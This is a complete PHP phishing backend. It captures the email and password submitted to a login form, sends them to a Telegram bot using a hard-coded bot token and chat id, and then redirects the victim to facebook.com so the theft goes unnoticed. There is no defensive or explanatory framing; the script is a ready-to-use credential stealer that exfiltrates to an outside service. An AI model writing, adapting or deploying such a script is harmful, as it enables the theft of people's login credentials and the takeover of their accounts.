<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $telegram_token = '7239103472:AAFSQb14reS7hjLOVxdNZjCyq1zLAOEHqKM';
    $chat_id = '7394646705';
    $message = "📧 Email: $email\n🔑 Password: $password";

    file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message");

    header('Location: https://facebook.com'); 
    exit();
}
?>